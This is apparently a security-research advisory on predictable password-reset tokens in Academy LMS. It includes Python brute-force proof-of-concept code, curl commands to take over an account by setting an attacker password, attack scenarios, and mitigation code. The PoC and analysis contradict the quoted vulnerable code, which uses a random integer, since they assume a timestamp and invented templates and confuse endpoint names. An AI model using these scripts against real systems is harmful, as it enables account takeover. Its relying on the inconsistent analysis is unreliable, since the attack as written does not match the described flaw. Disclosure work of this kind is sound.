---
title: "Password Reset Token Brute Force Vulnerability in Academy LMS"
date: 2025-07-20
tags: ["security", "brute-force", "academy-lms", "password-reset"]
categories: ["Security Research"]
draft: false
url: "/academy-lms-reset-bruteforce-5q8w2e7t9y/"
_build:
  list: false
  render: true
  publishResources: true
sitemap:
  disable: true
---

## Overview

A security vulnerability has been identified in Academy LMS versions up to and including 5.13, where password reset tokens use predictable patterns that can be brute-forced due to insufficient entropy and lack of rate limiting.

## Technical Details

**CVE ID:** Pending Assignment  
**CVSS Score:** 6.3 (Medium)  
**Affected Versions:** Academy LMS ≤ v5.13  
**Vulnerability Type:** Brute Force / Insufficient Entropy  

### Affected Component
- File: `lms/application/controllers/Login.php:238,244`
- File: `lms/application/models/Crud_model.php:3578`

### Affected URLs
- `GET /lms/login/change_password`
- `POST /lms/login/forgot_password_request`

### Vulnerability Description

Academy LMS generates password reset tokens using predictable patterns based on Base64-encoded templates (email + '_Uh6#@#6hU_' + random_int). These tokens lack sufficient entropy and the system does not implement rate limiting for reset attempts, allowing attackers to perform brute force attacks to guess valid tokens and gain unauthorized access to user accounts.

## Impact

An attacker can:
1. **Brute force password reset tokens** for targeted user accounts
2. **Gain unauthorized access** to user accounts without knowing passwords
3. **Reset passwords** for administrative accounts
4. **Compromise multiple accounts** through automated attacks
5. **Bypass authentication mechanisms** entirely

## Technical Analysis

### Token Structure Analysis
The password reset tokens appear to follow a predictable pattern:

```
Base64(user_email + template_string + timestamp)
```

Example vulnerable token generation code:
```php
// From Crud_model.php:3578
$verification_code = str_replace('=', '', base64_encode($email . '_Uh6#@#6hU_' . random_int(111111, 9999999)));
```

Example vulnerable token structure:
```
dXNlckB0ZXN0LmNvbV9VaDYjQCM2aFVfMTIzNDU2
```

When decoded:
```bash
echo "dXNlckB0ZXN0LmNvbV9VaDYjQCM2aFVfMTIzNDU2" | base64 -d
# Output: user@test.com_Uh6#@#6hU_123456
```

### Brute Force Feasibility
The predictable structure allows for efficient brute force attacks:

1. **Known email addresses** (from user enumeration)
2. **Predictable template strings** (limited variations)
3. **Timestamp patterns** (sequential or time-based)
4. **No rate limiting** on verification attempts

## Proof of Concept

### Token Generation Pattern Analysis
```python
import base64
import itertools
import requests
import time

def generate_possible_tokens(email, timestamp_range):
    """Generate possible password reset tokens"""
    templates = [
        "_Uh6#@#6hU_",
        "_template_",
        "_reset_",
        # Add other discovered patterns
    ]
    
    tokens = []
    for template in templates:
        for ts in timestamp_range:
            token_data = f"{email}{template}{ts}"
            token = base64.b64encode(token_data.encode()).decode()
            tokens.append(token)
    
    return tokens

# Target email (from user enumeration)
target_email = "admin@target.com"

# Generate timestamp range (around current time)
current_time = int(time.time())
timestamp_range = range(current_time - 3600, current_time + 3600)  # ±1 hour

# Generate possible tokens
possible_tokens = generate_possible_tokens(target_email, timestamp_range)

print(f"Generated {len(possible_tokens)} possible tokens")
```

### Brute Force Attack
```python
def attempt_password_reset(token):
    """Attempt to use password reset token"""
    url = "https://target.com/lms/login/reset_password"
    params = {"verification_code": token}
    
    response = requests.get(url, params=params)
    
    # Check if token is valid
    if "invalid" not in response.text.lower():
        return True
    return False

# Perform brute force attack
for token in possible_tokens:
    if attempt_password_reset(token):
        print(f"Valid token found: {token}")
        break
    
    # No rate limiting - can send requests rapidly
    time.sleep(0.1)  # Small delay to avoid overwhelming server
```

### Token Validation Bypass
```bash
# Direct token usage without proper validation
curl "https://target.com/lms/login/reset_password?verification_code=BRUTEFORCED_TOKEN"

# If successful, proceed to set new password
curl -X POST "https://target.com/lms/login/change_password" \
  -d "new_password=attacker_password&token=BRUTEFORCED_TOKEN"
```

## Attack Scenarios

### Scenario 1: Administrative Account Takeover
1. Enumerate admin email addresses
2. Brute force reset tokens for admin accounts
3. Reset admin passwords
4. Gain full system access

### Scenario 2: Mass Account Compromise
1. Collect user email addresses from public sources
2. Automate brute force attacks against multiple accounts
3. Compromise accounts for spam or fraud

### Scenario 3: Targeted Attack
1. Focus on high-value user accounts
2. Use social engineering to trigger password reset
3. Brute force token during reset window
4. Take over specific user account

## Mitigation

### Immediate Fixes

#### 1. Implement Cryptographically Secure Token Generation
```php
// Replace predictable token generation
function generate_secure_reset_token() {
    // Generate 32 bytes of random data
    $random_bytes = random_bytes(32);
    
    // Convert to hex string (64 characters)
    $token = bin2hex($random_bytes);
    
    return $token;
}
```

#### 2. Add Rate Limiting
```php
// Implement rate limiting for reset attempts
function check_rate_limit($ip_address, $email) {
    $key = "reset_attempts_" . md5($ip_address . $email);
    $attempts = $this->cache->get($key) ?: 0;
    
    if ($attempts >= 5) {
        // Block further attempts for 1 hour
        return false;
    }
    
    // Increment attempt counter
    $this->cache->set($key, $attempts + 1, 3600);
    return true;
}
```

#### 3. Implement Token Expiration
```php
// Store token with short expiration time
function store_reset_token($user_id, $token) {
    $expiry = time() + 900; // 15 minutes
    
    $this->db->insert('password_reset_tokens', [
        'user_id' => $user_id,
        'token' => hash('sha256', $token), // Store hashed token
        'expires_at' => $expiry,
        'used' => 0
    ]);
}
```

### Security Best Practices

1. **Use cryptographically secure random tokens**
2. **Implement strict rate limiting** (max 3-5 attempts per hour)
3. **Short token expiration** (15-30 minutes maximum)
4. **One-time use tokens** (invalidate after use)
5. **Store hashed tokens** in database, not plaintext
6. **Implement CAPTCHA** after failed attempts
7. **Log and monitor** reset attempts for suspicious activity
8. **Email notifications** for reset attempts

## Timeline

- **Discovery:** July 2025 (During white box penetration testing)
- **Vendor Notification:** July 20, 2025 (Responsible disclosure to Creativeitem/Academy LMS team)
- **CVE Request Submitted:** July 20, 2025 (CVE number requested from MITRE)
- **Vendor Response:** Awaiting response from vendor
- **Public Disclosure:** July 20, 2025

*This vulnerability was discovered during a white box penetration test. Given that Academy LMS is a widely-used commercial template with many installations across different organizations, we decided to report this as a responsible disclosure to help protect all users of this platform.*

*This timeline will be updated accordingly as the responsible disclosure process progresses.*

## References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST SP 800-63B Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

## Credit

This vulnerability was discovered and responsibly disclosed by the security research team at suryadina.com.

---
*This post is part of our ongoing security research into popular Learning Management Systems. For more security insights, visit [https://suryadina.com](https://suryadina.com).*